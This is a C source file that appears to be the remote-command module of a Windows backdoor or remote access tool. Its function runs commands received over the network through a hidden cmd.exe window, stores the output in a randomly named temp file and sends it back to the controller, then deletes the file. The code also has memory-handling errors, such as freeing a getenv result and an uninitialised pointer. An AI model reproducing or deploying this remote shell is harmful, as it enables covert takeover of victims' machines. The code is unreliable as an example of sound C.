#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include "types.h"
#include "net/interface.h"
#include "net/commands.h"

int net_cmd_System(char* msg, int msgLen)
{
	char* temp_path = getenv("TEMP");
	char* rand_name = main_nameGenerator(temp_path);
	int len = strlen(rand_name) + 1;
	char* buff_path = malloc(len);
	snprintf(buff_path, len, "%s", rand_name);
	free(temp_path);
	free(rand_name);

	char buff[100];
	memset(buff, 0, 100);

	PROCESS_INFORMATION pi; 
	STARTUPINFO si;
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = 1;       

	memset(&pi, 0, sizeof(PROCESS_INFORMATION));
	memset(&si, 0, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO); 

	char* _nmsg = malloc(strlen(msg) + strlen("cmd.exe /c  > ") + strlen(buff_path) + sizeof(char));
	sprintf(_nmsg, "cmd.exe /c %s > %s", msg, buff_path);

	if(CreateProcess(NULL, _nmsg, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
		Sleep(2000);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		free(_nmsg);

		FILE *f = fopen(buff_path, "r");

		fseek(f, 0, SEEK_SET);
		char* rmsg;

		while(fgets(buff, 100, f) != NULL)
		{	
			if(net_SendData(buff, strlen(buff)) < 1)
			{
				fclose(f);
				remove(buff_path);
				free(buff_path);
				free(rmsg);
	
				return -1;
			}
			
			if(net_ReciveDataTimeout(&rmsg) < 1)
			{
				fclose(f);
				remove(buff_path);
				free(buff_path);
				free(rmsg);
		
				return 1;
			}
		
			if(rmsg[1] != '+')
			{
				fclose(f);
				remove(buff_path);
				free(buff_path);
				free(rmsg);
		
				return 1;
			}
			
			memset(buff, 0, 100);
		}

		TerminateProcess(pi.hProcess, 0);
		fclose(f);
		free(rmsg);
	}else{
		free(_nmsg);
	}

	remove(buff_path);
	free(buff_path);
	memset(buff, 0, 100);
	buff[0] = NET_CMD_SYSTEM;
	
	if(net_SendData(buff, 2) < 1)
	{
		return -1;
	}

	return 1;
}
